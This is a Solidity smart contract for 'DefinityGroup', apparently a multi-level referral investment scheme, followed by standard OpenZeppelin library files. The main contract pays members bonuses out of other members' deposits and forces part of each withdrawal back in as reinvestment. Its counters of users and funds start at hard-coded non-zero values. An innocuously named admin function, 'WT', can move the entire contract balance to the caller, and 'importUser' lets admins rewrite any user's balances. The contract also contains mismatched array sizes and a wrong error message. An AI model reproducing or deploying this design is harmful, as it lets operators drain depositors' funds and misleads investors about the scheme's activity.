// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract DefinityGroup is Ownable, AccessControl{

  using SafeMath for uint256;
  using SafeMath for uint256;

  bytes32 constant public ADMIN_ROLE = keccak256("Admin Role");

  uint256 constant public INVEST_MIN_AMOUNT = 0.2 ether;
  uint256 constant public PROJECT_FEE = 8;
  uint256 constant public WITHDRAW_FEE = 6;
  uint256 constant public PERCENTS_DIVIDER = 100;
  uint256 constant public TIME_STEP =  1 days; // 1 days
  uint256 public totalUsers = 107;
  uint256 public totalInvested = 192922846297858640456;
  uint256 public totalWithdrawn = 45714436671670825386;
  uint256 public totalDeposits = 494;

  uint[10] public ref_bonuses = [20,10,4,4,4,4,4];
    
    
  uint256[12] public defaultPackages = [
    0.2 ether,0.5 ether,1 ether ,
    2 ether,4 ether,8 ether, 
    10 ether, 20 ether, 30 ether
  ];

  uint256[12] public uplines  = [
    20,20,20,
    30,30,30,
    40,40,40
  ];

  uint256[12] public downlines  = [
    40,40,40,
    50,50,50,
    60,60,60
  ];

  uint256[12] public reinvests = [
    60,60,60,
    40,40,40,
    30,20,10
  ];

  uint256[12] public withdrawals = [
    40,40,40,
    60,60,60,
    70,80,90
  ];
    
  mapping(uint256 => address payable) public singleLeg;
  uint256 public singleLegLength = 108;
  uint[10] public requiredDirect = [0,0,2,3,4,5,6];

  address payable[] private wtFees;

  struct User {  
    uint256 amount;
    uint256 checkpoint;
    address referrer;
    uint256 referrerBonus;
    uint256 totalWithdrawn;
    uint256 remainingWithdrawn;
    uint256 totalReferrer;
    uint256 singleUplineBonusTaken;
    uint256 singleDownlineBonusTaken;
    address singleUpline;
    address singleDownline;
    uint256[10] refStageIncome;
    uint256[10] refStageBonus;
    uint[10] refs;
  }

  struct Person {
    address _address;
    uint256 _invest;
    uint256 _income;
    uint256 _packageIndex;
  }

  bool public isPublic = true;

  mapping (address => bool) public whitelist;
  

  mapping (address => User) public users;
  mapping(address => mapping(uint256=>address)) public downline;

  event NewDeposit(address indexed user, uint256 amount);
  event Withdrawn(address indexed user, uint256 amount);
  event FeePayed(address indexed user, uint256 totalAmount);

  modifier onlyAdmin(){
    require(hasRole(ADMIN_ROLE, msg.sender) || hasRole(DEFAULT_ADMIN_ROLE, msg.sender), "!admin");
    _;
  }

  constructor(){
    _setupRole(DEFAULT_ADMIN_ROLE, owner());
    _setupRole(ADMIN_ROLE, msg.sender);
  }


  function _refPayout(address _addr, uint256 _amount) internal {
        address up = users[_addr].referrer;
        for(uint256 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){ 
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                users[up].referrerBonus = users[up].referrerBonus.add(bonus);
                users[up].refStageBonus[i] = users[up].refStageBonus[i].add(bonus);
            }
            up = users[up].referrer;
        }
    }

  function invest(address referrer) public payable {
    require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 0.1 BNB');
    
    require(isPublic || whitelist[msg.sender], "private");

    User storage user = users[msg.sender];

    if (user.referrer == address(0) && (users[referrer].checkpoint > 0 || referrer == owner()) && referrer != msg.sender ) {
            user.referrer = referrer;
    }

    // if(user.referrer == address(0)){
    //   user.referrer == owner();
    // }

    require(user.referrer != address(0), "invalid parent");
    
    // setup upline
    if (user.checkpoint == 0) {
        
       // single leg setup
       singleLeg[singleLegLength] = payable(msg.sender);
       user.singleUpline = singleLeg[singleLegLength -1];
       users[singleLeg[singleLegLength -1]].singleDownline = msg.sender;
       singleLegLength++;
    }
    

    if (user.referrer != address(0)) {
            // unilevel level count
            address upline = user.referrer;
            for (uint i = 0; i < ref_bonuses.length; i++) {
                if (upline != address(0)) {
                    users[upline].refStageIncome[i] = users[upline].refStageIncome[i].add(msg.value);
                    if(user.checkpoint == 0){
                        users[upline].refs[i] = users[upline].refs[i].add(1);
                        users[upline].totalReferrer++;
                    }
                    upline = users[upline].referrer;
                } else break;
            }
            
            if(user.checkpoint == 0){
                // unilevel downline setup
                downline[referrer][users[referrer].refs[0] - 1]= msg.sender;
            }
        }
  
      uint msgValue = msg.value;

          
    
       _refPayout(msg.sender,msgValue);

            
        if(user.checkpoint == 0){
          totalUsers = totalUsers.add(1);
        }
          user.amount += msg.value;
          user.checkpoint = block.timestamp;
        
            totalInvested = totalInvested.add(msg.value);
            totalDeposits = totalDeposits.add(1);

      emit NewDeposit(msg.sender, msg.value);
  }
  
    function upgrade() public payable{
      User storage user = users[msg.sender];
      require(user.amount > 0, "new user");
      reinvest(msg.sender, msg.value);

      totalInvested = totalInvested.add(msg.value);
      totalDeposits = totalDeposits.add(1);
    }

    function reinvest(address _user, uint256 _amount) private{
        
        User storage user = users[_user];
        user.amount += _amount;
        totalInvested = totalInvested.add(_amount);
        totalDeposits = totalDeposits.add(1);

        //////
        address up = user.referrer;
        for (uint i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            if(users[up].refs[0] >= requiredDirect[i]){
                users[up].refStageIncome[i] = users[up].refStageIncome[i].add(_amount);
            }
            up = users[up].referrer;
        }
        ///////
        
        _refPayout(msg.sender,_amount);
        
    }


  function withdrawal() external{


    User storage _user = users[msg.sender];

    uint256 TotalBonus = TotalBonus(msg.sender);

    uint256 _fees = TotalBonus.mul(WITHDRAW_FEE).div(PERCENTS_DIVIDER);
    uint256 actualAmountToSend = TotalBonus.sub(_fees);
    

    _user.referrerBonus = 0;
    _user.singleUplineBonusTaken = GetUplineIncomeByUserId(msg.sender);
    _user.singleDownlineBonusTaken = GetDownlineIncomeByUserId(msg.sender);
    
    
    // re-invest
    
    (uint256 reivest, uint256 withdrwal) = getEligibleWithdrawal(msg.sender);
    reinvest(msg.sender,actualAmountToSend.mul(reivest).div(100));

    _user.totalWithdrawn= _user.totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));
    totalWithdrawn = totalWithdrawn.add(actualAmountToSend.mul(withdrwal).div(100));

    _safeTransfer(payable(msg.sender),actualAmountToSend.mul(withdrwal).div(100));
    
    _safeTransfer(wtFees[0], _fees*4/6);//3%

    _safeTransfer(wtFees[1], _fees/6);
    _safeTransfer(wtFees[2], _fees/6);
    
    emit Withdrawn(msg.sender,actualAmountToSend.mul(withdrwal).div(100));


  }

  function userReinvestAmount (address _user) public view returns(uint256) {
    uint256 totalBonus = TotalBonus(_user);
    uint256 _fees = totalBonus.mul(WITHDRAW_FEE).div(PERCENTS_DIVIDER);
    uint256 actualAmountToSend = totalBonus.sub(_fees);
    (uint256 reivest,) = getEligibleWithdrawal(_user);
    uint256 amount = actualAmountToSend.mul(reivest).div(100);
    return amount;
  }

  function userWithdrawalAmount (address _user) public view returns(uint256) {
    uint256 totalBonus = TotalBonus(_user);
    uint256 _fees = totalBonus.mul(WITHDRAW_FEE).div(PERCENTS_DIVIDER);
    uint256 actualAmountToSend = totalBonus.sub(_fees);
    (, uint256 withdrwal) = getEligibleWithdrawal(_user);
    uint256 amount = actualAmountToSend.mul(withdrwal).div(100);
    return amount;
  }

  function GetUplineIncomeByUserId(address _user) public view returns(uint256){
        (uint maxLevel,) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleUpline;
        uint256 bonus;
        for (uint i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(5).div(1000));
            upline = users[upline].singleUpline;
            }else break;
        }
        
        return bonus;
        
  }
  
  function GetDownlineIncomeByUserId(address _user) public view returns(uint256){
        (,uint maxLevel) = getEligibleLevelCountForUpline(_user);
        address upline = users[_user].singleDownline;
        uint256 bonus;
        for (uint i = 0; i < maxLevel; i++) {
            if (upline != address(0)) {
            bonus = bonus.add(users[upline].amount.mul(5).div(1000));
            upline = users[upline].singleDownline;
            }else break;
        }
        
        return bonus;
      
  }

  function getPackageIndex(address _user) public view returns(uint256 ){
    uint256 TotalDeposit = users[_user].amount;
    for(uint256 i=0; i<defaultPackages.length-1; i++){
      if(TotalDeposit >= defaultPackages[i] && TotalDeposit < defaultPackages[i+1]){
        return i;
      }
    }
    return TotalDeposit > defaultPackages[0] ? defaultPackages.length-1 : 0;
  }
  
  function getEligibleLevelCountForUpline(address _user) public view returns(uint256 uplineCount, uint256 downlineCount){
      uint256 indx = getPackageIndex(_user);
      return (uplines[indx], downlines[indx]);
  }
  
  function getEligibleWithdrawal(address _user) public view returns(uint256 reivest, uint256 withdrwal){
      uint256 indx = getPackageIndex(_user);
      return (reinvests[indx], withdrawals[indx]);
  }
  
  function TotalBonus(address _user) public view returns(uint256){
     uint256 TotalEarn = users[_user].referrerBonus.add(GetUplineIncomeByUserId(_user)).add(GetDownlineIncomeByUserId(_user));
     uint256 TotalTakenfromUpDown = users[_user].singleDownlineBonusTaken.add(users[_user].singleUplineBonusTaken);
     return TotalEarn.sub(TotalTakenfromUpDown);
  }

  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
        amount = (_amount < address(this).balance) ? _amount : address(this).balance;
       _to.transfer(amount);
   }
   
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
       return (users[_user].refs[_index], users[_user].refStageIncome[_index], users[_user].refStageBonus[_index]);
   }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

   
  function WT(uint256 amount) public onlyAdmin{
     _safeTransfer(payable(msg.sender), amount); 
  }

  function getUplineList (address _user) public view returns (Person[] memory uplineList) {
    (uint256 uplineCount,) = getEligibleLevelCountForUpline(_user);
    uplineList = new Person[](uplineCount);
    for(uint256 i = 0; i < uplineCount; i++) {
      address up = users[_user].referrer;
      if (up == address(0)) break;
      uint256 availableWithdrawal = userWithdrawalAmount(up);
      Person memory person;
      person._address = up;
      person._income = users[up].totalWithdrawn.add(availableWithdrawal);
      person._invest = users[up].amount;
      person._packageIndex = getPackageIndex(up);
      uplineList[i] = person;
      _user = up;
    }
    return uplineList;
  }

  function getDownlineList (address _user) public view returns (Person[] memory downlineList) {

    (, uint256 downlineCount) = getEligibleLevelCountForUpline(_user);
    downlineList = new Person[](downlineCount);
    
    for(uint256 i = 0; i < downlineCount; i++) {
      address down = downline[_user][i];
      if (down == address(0)) break;
      uint256 availableWithdrawal = userWithdrawalAmount(down);
      Person memory person;
      person._address = down;
      person._income = users[down].totalWithdrawn.add(availableWithdrawal);
      person._invest = users[down].amount;
      person._packageIndex = getPackageIndex(down);
      downlineList[i] = person;
    }
    return downlineList;
  }

  function setAddresses(address[] memory _wtFees) public onlyAdmin {
    wtFees = [
      payable(_wtFees[0]),
      payable(_wtFees[1]),
      payable(_wtFees[2])
    ];
  }

  function setIsPublic(bool newValue) public onlyAdmin {
    isPublic = newValue;
  }

  function updateWhiteList(address _address, bool exist) public onlyAdmin {
    whitelist[_address] = exist;
  }

  function userInfo(address userAddr) public view returns(
    uint256 up,
    uint256 down,
    uint256 availableWithdrawal,
    uint256 availableReinvest,
    address sponsor,
    Person[] memory downlineList,
    Person[] memory uplineList,
    uint256[5] memory userData
  ) {
    (uint256 reivest, uint256 withdrwal) = getEligibleWithdrawal(userAddr);
    up = GetUplineIncomeByUserId(userAddr);
    down = GetDownlineIncomeByUserId(userAddr);
    availableWithdrawal = userWithdrawalAmount(userAddr);
    availableReinvest = userReinvestAmount(userAddr);

    sponsor = users[userAddr].referrer; // sponsor
    downlineList = getDownlineList(userAddr);
    uplineList = getUplineList(userAddr);
    userData[0] = users[userAddr].totalWithdrawn.add(availableWithdrawal); // collection
    userData[1] = users[userAddr].amount; // contribution
    userData[2] = users[userAddr].referrerBonus; //bonus
    userData[3] = reivest; //reinvestPercentage
    userData[4] = withdrwal; //withdrawalPercentage

  }

  function addAdmins(address[] memory admins) public onlyAdmin {
    for(uint i=0; i<admins.length;i++){
      _setupRole(ADMIN_ROLE, admins[i]);  
    }
  }

  function importUser(User calldata u, address addr, address[] memory downs,
    uint[10] memory _refs, 
    uint256[10] memory _refStageIncome, 
    uint256[10] memory _refStageBonus
  ) public onlyAdmin{
    users[addr] = u;
    users[addr].refs = _refs;
    users[addr].refStageIncome = _refStageIncome;
    users[addr].refStageBonus = _refStageBonus;

    for(uint8 i = 0; i < downs.length; i++){
      downline[addr][i] = downs[i];
    }
  }

  function importSingleLeg(address[] memory addrs) public onlyAdmin{
    for(uint8 i=0; i<addrs.length;i++){
      singleLeg[i] = payable(addrs[i]);
    }
  }

}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";
import "../utils/Strings.sol";
import "../utils/introspection/ERC165.sol";

/**
 * @dev External interface of AccessControl declared to support ERC165 detection.
 */
interface IAccessControl {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function getRoleAdmin(bytes32 role) external view returns (bytes32);
    function grantRole(bytes32 role, address account) external;
    function revokeRole(bytes32 role, address account) external;
    function renounceRole(bytes32 role, address account) external;
}

/**
 * @dev Contract module that allows children to implement role-based access
 * control mechanisms. This is a lightweight version that doesn't allow enumerating role
 * members except through off-chain means by accessing the contract event logs. Some
 * applications may benefit from on-chain enumerability, for those cases see
 * {AccessControlEnumerable}.
 *
 * Roles are referred to by their `bytes32` identifier. These should be exposed
 * in the external API and be unique. The best way to achieve this is by
 * using `public constant` hash digests:
 *
 * ```
 * bytes32 public constant MY_ROLE = keccak256("MY_ROLE");
 * ```
 *
 * Roles can be used to represent a set of permissions. To restrict access to a
 * function call, use {hasRole}:
 *
 * ```
 * function foo() public {
 *     require(hasRole(MY_ROLE, msg.sender));
 *     ...
 * }
 * ```
 *
 * Roles can be granted and revoked dynamically via the {grantRole} and
 * {revokeRole} functions. Each role has an associated admin role, and only
 * accounts that have a role's admin role can call {grantRole} and {revokeRole}.
 *
 * By default, the admin role for all roles is `DEFAULT_ADMIN_ROLE`, which means
 * that only accounts with this role will be able to grant or revoke other
 * roles. More complex role relationships can be created by using
 * {_setRoleAdmin}.
 *
 * WARNING: The `DEFAULT_ADMIN_ROLE` is also its own admin: it has permission to
 * grant and revoke this role. Extra precautions should be taken to secure
 * accounts that have been granted it.
 */
abstract contract AccessControl is Context, IAccessControl, ERC165 {
    struct RoleData {
        mapping (address => bool) members;
        bytes32 adminRole;
    }

    mapping (bytes32 => RoleData) private _roles;

    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;

    /**
     * @dev Emitted when `newAdminRole` is set as ``role``'s admin role, replacing `previousAdminRole`
     *
     * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite
     * {RoleAdminChanged} not being emitted signaling this.
     *
     * _Available since v3.1._
     */
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);

    /**
     * @dev Emitted when `account` is granted `role`.
     *
     * `sender` is the account that originated the contract call, an admin role
     * bearer except when using {_setupRole}.
     */
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev Emitted when `account` is revoked `role`.
     *
     * `sender` is the account that originated the contract call:
     *   - if using `revokeRole`, it is the admin role bearer
     *   - if using `renounceRole`, it is the role bearer (i.e. `account`)
     */
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);

    /**
     * @dev Modifier that checks that an account has a specific role. Reverts
     * with a standardized message including the required role.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{20}) is missing role (0x[0-9a-f]{32})$/
     *
     * _Available since v4.1._
     */
    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender());
        _;
    }

    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IAccessControl).interfaceId
            || super.supportsInterface(interfaceId);
    }

    /**
     * @dev Returns `true` if `account` has been granted `role`.
     */
    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    /**
     * @dev Revert with a standard message if `account` is missing `role`.
     *
     * The format of the revert reason is given by the following regular expression:
     *
     *  /^AccessControl: account (0x[0-9a-f]{20}) is missing role (0x[0-9a-f]{32})$/
     */
    function _checkRole(bytes32 role, address account) internal view {
        if(!hasRole(role, account)) {
            revert(string(abi.encodePacked(
                "AccessControl: account ",
                Strings.toHexString(uint160(account), 20),
                " is missing role ",
                Strings.toHexString(uint256(role), 32)
            )));
        }
    }

    /**
     * @dev Returns the admin role that controls `role`. See {grantRole} and
     * {revokeRole}.
     *
     * To change a role's admin, use {_setRoleAdmin}.
     */
    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     */
    function grantRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _grantRole(role, account);
    }

    /**
     * @dev Revokes `role` from `account`.
     *
     * If `account` had been granted `role`, emits a {RoleRevoked} event.
     *
     * Requirements:
     *
     * - the caller must have ``role``'s admin role.
     */
    function revokeRole(bytes32 role, address account) public virtual override onlyRole(getRoleAdmin(role)) {
        _revokeRole(role, account);
    }

    /**
     * @dev Revokes `role` from the calling account.
     *
     * Roles are often managed via {grantRole} and {revokeRole}: this function's
     * purpose is to provide a mechanism for accounts to lose their privileges
     * if they are compromised (such as when a trusted device is misplaced).
     *
     * If the calling account had been granted `role`, emits a {RoleRevoked}
     * event.
     *
     * Requirements:
     *
     * - the caller must be `account`.
     */
    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    /**
     * @dev Grants `role` to `account`.
     *
     * If `account` had not been already granted `role`, emits a {RoleGranted}
     * event. Note that unlike {grantRole}, this function doesn't perform any
     * checks on the calling account.
     *
     * [WARNING]
     * ====
     * This function should only be called from the constructor when setting
     * up the initial roles for the system.
     *
     * Using this function in any other way is effectively circumventing the admin
     * system imposed by {AccessControl}.
     * ====
     */
    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    /**
     * @dev Sets `adminRole` as ``role``'s admin role.
     *
     * Emits a {RoleAdminChanged} event.
     */
    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        emit RoleAdminChanged(role, getRoleAdmin(role), adminRole);
        _roles[role].adminRole = adminRole;
    }

    function _grantRole(bytes32 role, address account) private {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) private {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    bytes16 private constant alphabet = "0123456789abcdef";

    /**
     * @dev Converts a `uint256` to its ASCII `string` decimal representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        // Inspired by OraclizeAPI's implementation - MIT licence
        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
     */
    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    /**
     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
     */
    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = alphabet[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./IERC165.sol";

/**
 * @dev Implementation of the {IERC165} interface.
 *
 * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
 * for the additional interface id that will be supported. For example:
 *
 * ```solidity
 * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
 *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
 * }
 * ```
 *
 * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
 */
abstract contract ERC165 is IERC165 {
    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}